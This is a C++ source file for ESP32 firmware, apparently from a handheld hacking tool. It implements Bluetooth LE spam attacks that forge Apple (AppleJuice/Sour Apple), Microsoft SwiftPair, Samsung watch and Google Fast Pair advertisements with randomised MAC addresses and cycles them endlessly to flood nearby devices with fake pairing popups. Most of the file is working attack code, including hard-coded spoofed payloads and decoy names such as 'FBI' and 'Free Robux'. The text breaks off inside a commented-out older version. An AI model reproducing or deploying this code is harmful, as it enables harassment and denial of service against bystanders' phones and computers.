
#include "ble_spam.h"
#include "display.h"
#include "mykeyboard.h"
#include "globals.h"
/*
extern "C" {
  uint8_t esp_base_mac_addr[6];
  esp_err_t esp_ble_gap_set_rand_addr(const uint8_t *rand_addr);
}
*/
struct BLEData
{
  BLEAdvertisementData AdvData;
  BLEAdvertisementData ScanData;
};

struct WatchModel
{
    uint8_t value;
    const char *name;
};

//WatchModel* watch_models = nullptr;

struct mac_addr {
   unsigned char bytes[6];
};

struct Station {
  uint8_t mac[6];
  bool selected;
};
enum EBLEPayloadType
{
  Microsoft,
  Apple,
  Samsung,
  Google
};

// globals for passing bluetooth info between routines
// AppleJuice Payload Data 
uint8_t Airpods[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//uint8_t AirpodsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//uint8_t AirpodsMax[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//uint8_t AirpodsGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//uint8_t AirpodsGen3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//uint8_t AirpodsProGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//uint8_t PowerBeats[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//uint8_t PowerBeatsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//uint8_t BeatsSoloPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//uint8_t BeatsStudioBuds[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//uint8_t BeatsFlex[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; 
//uint8_t BeatsX[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//uint8_t BeatsSolo3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//uint8_t BeatsStudio3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//uint8_t BeatsStudioPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//uint8_t BeatsFitPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//uint8_t BeatsStudioBudsPlus[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//uint8_t AppleTVSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleTVPair[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
//uint8_t AppleTVNewUser[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
//uint8_t AppleTVAppleIDSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
//uint8_t AppleTVWirelessAudioSync[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
//uint8_t AppleTVHomekitSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
//uint8_t AppleTVKeyboard[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
//uint8_t AppleTVConnectingToNetwork[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
//uint8_t HomepodSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
//uint8_t SetupNewPhone[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
//uint8_t TransferNumber[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
//uint8_t TVColorBalance[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
//uint8_t AppleVisionPro[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

uint8_t Airpods_AppleTV[54] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

uint8_t* data;
int deviceType = 0; 

struct DeviceType {
    uint32_t value;
    String name;
};

DeviceType android_models[] = {
    // Genuine non-production/forgotten (good job Google)
    {0x0001F0, "Bisto CSR8670 Dev Board"},
    {0x000047, "Arduino 101"},
    {0x470000, "Arduino 101 2"},
    {0x00000A, "Anti-Spoof Test"},
    {0x0A0000, "Anti-Spoof Test 2"},
    {0x00000B, "Google Gphones"},
    {0x0B0000, "Google Gphones 2"},
    /*{0x0C0000, "Google Gphones 3"},
    {0x00000D, "Test 00000D"},
    {0x000007, "Android Auto"},
    {0x070000, "Android Auto 2"},
    {0x000008, "Foocorp Foophones"},
    {0x080000, "Foocorp Foophones 2"},
    {0x000009, "Test Android TV"},
    {0x090000, "Test Android TV 2"},
    {0x000035, "Test 000035"},
    {0x350000, "Test 000035 2"},
    {0x000048, "Fast Pair Headphones"},
    {0x480000, "Fast Pair Headphones 2"},
    {0x000049, "Fast Pair Headphones 3"},
    {0x490000, "Fast Pair Headphones 4"},
    {0x001000, "LG HBS1110"},
    {0x00B727, "Smart Controller 1"},
    {0x01E5CE, "BLE-Phone"},
    {0x0200F0, "Goodyear"},
    {0x00F7D4, "Smart Setup"},
    {0xF00002, "Goodyear"},
    {0xF00400, "T10"},
    {0x1E89A7, "ATS2833_EVB"},

    // Phone setup
    {0x00000C, "Google Gphones Transfer"},
    {0x0577B1, "Galaxy S23 Ultra"},
    {0x05A9BC, "Galaxy S20+"},

    // Genuine devices
    {0xCD8256, "Bose NC 700"},
    {0x0000F0, "Bose QuietComfort 35 II"},
    {0xF00000, "Bose QuietComfort 35 II 2"},
    {0x821F66, "JBL Flip 6"},
    {0xF52494, "JBL Buds Pro"},
    {0x718FA4, "JBL Live 300TWS"},
    {0x0002F0, "JBL Everest 110GA"},
    {0x92BBBD, "Pixel Buds"},
    {0x000006, "Google Pixel buds"},
    {0x060000, "Google Pixel buds 2"},
    {0xD446A7, "Sony XM5"},
    {0x2D7A23, "Sony WF-1000XM4"},
    {0x0E30C3, "Razer Hammerhead TWS"},
    {0x72EF8D, "Razer Hammerhead TWS X"},
    {0x72FB00, "Soundcore Spirit Pro GVA"},
  */  {0x0003F0, "LG HBS-835S"},
    {0x002000, "AIAIAI TMA-2 (H60)"},
    {0x003000, "Libratone Q Adapt On-Ear"},
    {0x003001, "Libratone Q Adapt On-Ear 2"},
    {0x00A168, "boAt  Airdopes 621"},
    {0x00AA48, "Jabra Elite 2"},
    {0x00AA91, "Beoplay E8 2.0"},
    {0x00C95C, "Sony WF-1000X"},
    {0x01EEB4, "WH-1000XM4"},
    {0x02AA91, "B&O Earset"},
    {0x01C95C, "Sony WF-1000X"},
    {0x02D815, "ATH-CK1TW"},
    {0x035764, "PLT V8200 Series"},
    {0x038CC7, "JBL TUNE760NC"},
    {0x02DD4F, "JBL TUNE770NC"},
    {0x02E2A9, "TCL MOVEAUDIO S200"},
    {0x035754, "Plantronics PLT_K2"},
    {0x02C95C, "Sony WH-1000XM2"},
    {0x038B91, "DENON AH-C830NCW"},
    {0x02F637, "JBL LIVE FLEX"},
    {0x02D886, "JBL REFLECT MINI NC"},
    {0xF00000, "Bose QuietComfort 35 II"},
    {0xF00001, "Bose QuietComfort 35 II"},
    {0xF00201, "JBL Everest 110GA"},
    {0xF00204, "JBL Everest 310GA"},
    {0xF00209, "JBL LIVE400BT"},
    {0xF00205, "JBL Everest 310GA"},
    {0xF00200, "JBL Everest 110GA"},
    {0xF00208, "JBL Everest 710GA"},
    {0xF00207, "JBL Everest 710GA"},
    {0xF00206, "JBL Everest 310GA"},
    {0xF0020A, "JBL LIVE400BT"},
    {0xF0020B, "JBL LIVE400BT"},
    {0xF0020C, "JBL LIVE400BT"},
  /*  {0xF00203, "JBL Everest 310GA"},
    {0xF00202, "JBL Everest 110GA"},
    {0xF00213, "JBL LIVE650BTNC"},
    {0xF0020F, "JBL LIVE500BT"},
    {0xF0020E, "JBL LIVE500BT"},
    {0xF00214, "JBL LIVE650BTNC"},
    {0xF00212, "JBL LIVE500BT"},
    {0xF0020D, "JBL LIVE400BT"},
    {0xF00211, "JBL LIVE500BT"},
    {0xF00215, "JBL LIVE650BTNC"},
    {0xF00210, "JBL LIVE500BT"},
    {0xF00305, "LG HBS-1500"},
    {0xF00304, "LG HBS-1010"},
    {0xF00308, "LG HBS-1125"},
    {0xF00303, "LG HBS-930"},
    {0xF00306, "LG HBS-1700"},
    {0xF00300, "LG HBS-835S"},
    {0xF00309, "LG HBS-2000"},
    {0xF00302, "LG HBS-830"},
    {0xF00307, "LG HBS-1120"},
    {0xF00301, "LG HBS-835"},
    {0xF00E97, "JBL VIBE BEAM"},
    {0x04ACFC, "JBL WAVE BEAM"},
    {0x04AA91, "Beoplay H4"},
    {0x04AFB8, "JBL TUNE 720BT"},
    {0x05A963, "WONDERBOOM 3"},
    {0x05AA91, "B&O Beoplay E6"},
    {0x05C452, "JBL LIVE220BT"},
    {0x05C95C, "Sony WI-1000X"},
    {0x0602F0, "JBL Everest 310GA"},
    {0x0603F0, "LG HBS-1700"},
    {0x1E8B18, "SRS-XB43"},
    {0x1E955B, "WI-1000XM2"},
    {0x1EC95C, "Sony WF-SP700N"},
    {0x1ED9F9, "JBL WAVE FLEX"},
    {0x1EE890, "ATH-CKS30TW WH"},
    {0x1EEDF5, "Teufel REAL BLUE TWS 3"},
    {0x1F1101, "TAG Heuer Calibre E4 45mm"},
    {0x1F181A, "LinkBuds S"},
    {0x1F2E13, "Jabra Elite 2"},
    {0x1F4589, "Jabra Elite 2"},
    {0x1F4627, "SRS-XG300"},
    {0x1F5865, "boAt Airdopes 441"},
    {0x1FBB50, "WF-C700N"},
    {0x1FC95C, "Sony WF-SP700N"},
    {0x1FE765, "TONE-TF7Q"},
    {0x1FF8FA, "JBL REFLECT MINI NC"},
    {0x201C7C, "SUMMIT"},
    {0x202B3D, "Amazfit PowerBuds"},
    {0x20330C, "SRS-XB33"},
    {0x003B41, "M&D MW65"},
    {0x003D8A, "Cleer FLOW II"},
    {0x005BC3, "Panasonic RP-HD610N"},
    {0x008F7D, "soundcore Glow Mini"},
    {0x00FA72, "Pioneer SE-MS9BN"},
    {0x0100F0, "Bose QuietComfort 35 II"},
    {0x011242, "Nirvana Ion"},
    {0x013D8A, "Cleer EDGE Voice"},
    {0x01AA91, "Beoplay H9 3rd Generation"},
    {0x038F16, "Beats Studio Buds"},
    {0x039F8F, "Michael Kors Darci 5e"},
    {0x03AA91, "B&O Beoplay H8i"},
    {0x03B716, "YY2963"},
    {0x03C95C, "Sony WH-1000XM2"},
    {0x03C99C, "MOTO BUDS 135"},
    {0x03F5D4, "Writing Account Key"},
    {0x045754, "Plantronics PLT_K2"},
    {0x045764, "PLT V8200 Series"},
    {0x04C95C, "Sony WI-1000X"},
    {0x050F0C, "Major III Voice"},
    {0x052CC7, "MINOR III"},
    {0x057802, "TicWatch Pro 5"},
    {0x0582FD, "Pixel Buds"},
    {0x058D08, "WH-1000XM4"},
    {0x06AE20, "Galaxy S21 5G"},
    {0x06C197, "OPPO Enco Air3 Pro"},
    {0x06C95C, "Sony WH-1000XM2"},
    {0x06D8FC, "soundcore Liberty 4 NC"},
    {0x0744B6, "Technics EAH-AZ60M2"},
    {0x07A41C, "WF-C700N"},
    {0x07C95C, "Sony WH-1000XM2"},
    {0x07F426, "Nest Hub Max"},
    {0x0102F0, "JBL Everest 110GA - Gun Metal"},
    {0x0202F0, "JBL Everest 110GA - Silver"},
    {0x0302F0, "JBL Everest 310GA - Brown"},
    {0x0402F0, "JBL Everest 310GA - Gun Metal"},
    {0x0502F0, "JBL Everest 310GA - Silver"},
    {0x0702F0, "JBL Everest 710GA - Gun Metal"},
    {0x0802F0, "JBL Everest 710GA - Silver"},
    {0x054B2D, "JBL TUNE125TWS"},
    {0x0660D7, "JBL LIVE770NC"},
    {0x0103F0, "LG HBS-835"},
    {0x0203F0, "LG HBS-830"},
    {0x0303F0, "LG HBS-930"},
    {0x0403F0, "LG HBS-1010"},
    {0x0503F0, "LG HBS-1500"},
    {0x0703F0, "LG HBS-1120"},
    {0x0803F0, "LG HBS-1125"},
    {0x0903F0, "LG HBS-2000"},
*/
    // Custom debug popups
    {0xD99CA1, "Flipper Zero"},
    {0x77FF67, "Free Robux"},
    {0xAA187F, "Free VBucks"},
    {0xDCE9EA, "Rickroll"},
    {0x87B25F, "Animated Rickroll"},
    {0x1448C9, "BLM"},
    {0x13B39D, "Talking Sasquach"},
    {0x7C6CDB, "Obama"},
    {0x005EF9, "Ryanair"},
    {0xE2106F, "FBI"},
    {0xB37A62, "Tesla"},
    {0x92ADC9, "Ton Upgrade Netflix"},
};

WatchModel watch_models[26] = {
  {0x1A, "Fallback Watch"},
  {0x01, "White Watch4 Classic 44m"},
  {0x02, "Black Watch4 Classic 40m"},
  {0x03, "White Watch4 Classic 40m"},
  {0x04, "Black Watch4 44mm"},
/*{0x05, "Silver Watch4 44mm"},
  {0x06, "Green Watch4 44mm"},
  {0x07, "Black Watch4 40mm"},
  {0x08, "White Watch4 40mm"},
  {0x09, "Gold Watch4 40mm"},
  {0x0A, "French Watch4"},
  {0x0B, "French Watch4 Classic"},
  {0x0C, "Fox Watch5 44mm"},
  {0x11, "Black Watch5 44mm"},
  {0x12, "Sapphire Watch5 44mm"},
  {0x13, "Purpleish Watch5 40mm"},
  {0x14, "Gold Watch5 40mm"},
  {0x15, "Black Watch5 Pro 45mm"},
  {0x16, "Gray Watch5 Pro 45mm"},
  {0x17, "White Watch5 44mm"},
  {0x18, "White & Black Watch5"},
*/{0x1B, "Black Watch6 Pink 40mm"},
  {0x1C, "Gold Watch6 Gold 40mm"},
  {0x1D, "Silver Watch6 Cyan 44mm"},
  {0x1E, "Black Watch6 Classic 43m"},
  {0x20, "Green Watch6 Classic 43m"},
};

const char* generateRandomName() {
  const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  int len = rand() % 10 + 1; // Generate a random length between 1 and 10
  char* randomName = (char*)malloc((len + 1) * sizeof(char)); // Allocate memory for the random name
  for (int i = 0; i < len; ++i) {
    randomName[i] = charset[rand() % strlen(charset)]; // Select random characters from the charset
  }
  randomName[len] = '\0'; // Null-terminate the string
  return randomName;
}

void generateRandomMac(uint8_t* mac) {
  // Set the locally administered bit and unicast bit for the first byte
  mac[0] = 0x02; // The locally administered bit is the second least significant bit

  // Generate the rest of the MAC address
  for (int i = 1; i < 6; i++) {
    mac[i] = random(0, 255);
  }
}

int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));

//ESP32 Sour Apple by RapierXbox
//Exploit by ECTO-1A
BLEAdvertising *pAdvertising;

//// https://github.com/Spooks4576
BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
  BLEAdvertisementData AdvData = BLEAdvertisementData();

  uint8_t* AdvData_Raw = nullptr;
  uint8_t i = 0;

  switch (Type) {
    case Microsoft: {
      
      const char* Name = generateRandomName();

      uint8_t name_len = strlen(Name);

      AdvData_Raw = new uint8_t[7 + name_len];

      AdvData_Raw[i++] = 7 + name_len - 1;
      AdvData_Raw[i++] = 0xFF;
      AdvData_Raw[i++] = 0x06;
      AdvData_Raw[i++] = 0x00;
      AdvData_Raw[i++] = 0x03;
      AdvData_Raw[i++] = 0x00;
      AdvData_Raw[i++] = 0x80;
      memcpy(&AdvData_Raw[i], Name, name_len);
      i += name_len;

      AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
      break;
    }
    case Apple: {
      AdvData_Raw = new uint8_t[17];

      AdvData_Raw[i++] = 17 - 1;    // Packet Length
      AdvData_Raw[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
      AdvData_Raw[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
      AdvData_Raw[i++] = 0x00;        // ...
      AdvData_Raw[i++] = 0x0F;  // Type
      AdvData_Raw[i++] = 0x05;                        // Length
      AdvData_Raw[i++] = 0xC1;                        // Action Flags
      //const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
      //AdvData_Raw[i++] = types[rand() % sizeof(types)];  // Action Type
      AdvData_Raw[i++] = data[rand() % sizeof(data)];  // Action Type
      esp_fill_random(&AdvData_Raw[i], 3); // Authentication Tag
      i += 3;   
      AdvData_Raw[i++] = 0x00;  // ???
      AdvData_Raw[i++] = 0x00;  // ???
      AdvData_Raw[i++] =  0x10;  // Type ???
      esp_fill_random(&AdvData_Raw[i], 3);

      AdvData.addData(std::string((char *)AdvData_Raw, 17));
      break;
    }
    case Samsung: {

      AdvData_Raw = new uint8_t[15];

      uint8_t model = watch_models[rand() % 25].value;
      
      AdvData_Raw[i++] = 14; // Size
      AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
      AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
      AdvData_Raw[i++] = 0x00; // ...
      AdvData_Raw[i++] = 0x01;
      AdvData_Raw[i++] = 0x00;
      AdvData_Raw[i++] = 0x02;
      AdvData_Raw[i++] = 0x00;
      AdvData_Raw[i++] = 0x01;
      AdvData_Raw[i++] = 0x01;
      AdvData_Raw[i++] = 0xFF;
      AdvData_Raw[i++] = 0x00;
      AdvData_Raw[i++] = 0x00;
      AdvData_Raw[i++] = 0x43;
      AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)

      AdvData.addData(std::string((char *)AdvData_Raw, 15));

      break;
    }
    case Google: {
      AdvData_Raw = new uint8_t[14];
      AdvData_Raw[i++] = 3;
      AdvData_Raw[i++] = 0x03;
      AdvData_Raw[i++] = 0x2C; // Fast Pair ID
      AdvData_Raw[i++] = 0xFE;

      AdvData_Raw[i++] = 6;
      AdvData_Raw[i++] = 0x16;
      AdvData_Raw[i++] = 0x2C; // Fast Pair ID
      AdvData_Raw[i++] = 0xFE;

      const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
      AdvData_Raw[i++] = (model >> 0x10) & 0xFF;
      AdvData_Raw[i++] = (model >> 0x08) & 0xFF;
      AdvData_Raw[i++] = (model >> 0x00) & 0xFF;

      //AdvData_Raw[i++] = 0x00; // Smart Controller Model ID
      //AdvData_Raw[i++] = 0xB7;
      //AdvData_Raw[i++] = 0x27;

      AdvData_Raw[i++] = 2;
      AdvData_Raw[i++] = 0x0A;
      AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm

      AdvData.addData(std::string((char *)AdvData_Raw, 14));
      break;
    }
    default: {
      Serial.println("Please Provide a Company Type");
      break;
    }
  }

  delete[] AdvData_Raw;

  return AdvData;
}
  //// https://github.com/Spooks4576

void executeSpam(EBLEPayloadType type) {
  uint8_t macAddr[6];
  if(type != Apple) {
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);
  }
  BLEDevice::init("");
  delay(10);
  BLEServer *pServer = BLEDevice::createServer();
  
  //esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  pAdvertising = pServer->getAdvertising();
  delay(40);
  //BLEAdvertisementData advertisementData = getSwiftAdvertisementData();
  BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->start();
  delay(10);
  if(type == Apple) delay(10);

  pAdvertising->stop();
  delay(10);
  BLEDevice::deinit();
}

void aj_adv(int ble_choice){

  if (ble_choice==0) data = Airpods;
  if (ble_choice==3) data = AppleTVPair;
  if (ble_choice==5) data = Airpods_AppleTV;

  int mael = 0;
  int timer = 0;
  int count = 0;
  timer = millis();
  while(1) {
    if(millis()-timer >800) {

      switch(ble_choice){
        case 0: // Applejuice
          displayRedStripe("Applejuice (" + String(count) + ")",TFT_WHITE,FGCOLOR);
          executeSpam(Apple);
          break;
        case 1: // SwiftPair
          displayRedStripe("SwiftPair  (" + String(count) + ")",TFT_WHITE,FGCOLOR);
          executeSpam(Microsoft);
          break;
        case 2: // Samsung
          displayRedStripe("Samsung  (" + String(count) + ")",TFT_WHITE,FGCOLOR);
          executeSpam(Samsung);
          break;
        case 3: // Sour Apple
          displayRedStripe("SourApple  (" + String(count) + ")",TFT_WHITE,FGCOLOR);
          executeSpam(Apple);
          break;
        case 4: // Android
          displayRedStripe("Android  (" + String(count) + ")",TFT_WHITE,FGCOLOR);
          executeSpam(Google);
          break;
        case 5: // Tutti-frutti
          displayRedStripe("Maelstrom  (" + String(count) + ")",TFT_WHITE,FGCOLOR);
          if(mael == 0) executeSpam(Google);
          if(mael == 1) executeSpam(Samsung);
          if(mael == 2) executeSpam(Microsoft);
          if(mael == 3) {
            executeSpam(Apple);
            mael = 0;
          } 
          break;
      }
      count++;
      timer = millis();
    }

    if(checkEscPress()) { 
      returnToMenu=true;
      break;
    }
  }
  
}




/*

BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
BLEAdvertising *pAdvertising;


//*********************************************************************
//  Function: aj_adv                                     
//  spams BLE from choice                                
//********************************************************************
void aj_adv(int ble_choice){

  tft.fillScreen(TFT_BLACK);
  bool rstOverride = true;
  bool swiftPair;
  bool androidPair;
  bool sourApple;
  bool maelstrom;

  switch(ble_choice){
    case 0:
      data = Airpods;
      sourApple = true;
      displayRedStripe("Applejuice",TFT_WHITE,FGCOLOR);
      delay(500);
      break;
    case 1:
      swiftPair = true;
      displayRedStripe("SwiftPair",TFT_WHITE,FGCOLOR);
      delay(500);
      break;
    case 2:
      androidPair = true;
      displayRedStripe("AndroidPair",TFT_WHITE,FGCOLOR);
      delay(500);
      break;
    case 3:
      sourApple = true;
      data = AppleTVPair;
      displayRedStripe("SourApple",TFT_WHITE,FGCOLOR);
      delay(500);
      break;
    case 4:
      maelstrom = true;
      displayRedStripe("Maelstrom",TFT_WHITE,FGCOLOR);
      delay(500);
      break;
  }
  int count = 0;
  int tmp = 0;
  tmp=millis();
  for(;;){
    if(millis()-tmp>1000) {
      uint8_t macAddr[6];
      generateRandomMac(macAddr);
      esp_base_mac_addr_set(macAddr);

      BLEDevice::init("");
      BLEServer *pServer = BLEDevice::createServer();
      pAdvertising = pServer->getAdvertising();
      BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

      if (sourApple){
        Serial.print("advertising");
        // Some code borrowed from RapierXbox/ESP32-Sour-Apple
        // Original credits for algorithm ECTO-1A & WillyJL
        uint8_t packet[17];
        uint8_t size = 17;
        uint8_t i = 0;
        packet[i++] = size - 1;    // Packet Length
        packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
        packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
        packet[i++] = 0x00;        // ...
        packet[i++] = 0x0F;  // Type
        packet[i++] = 0x05;                        // Length
        packet[i++] = 0xC1;                        // Action Flags
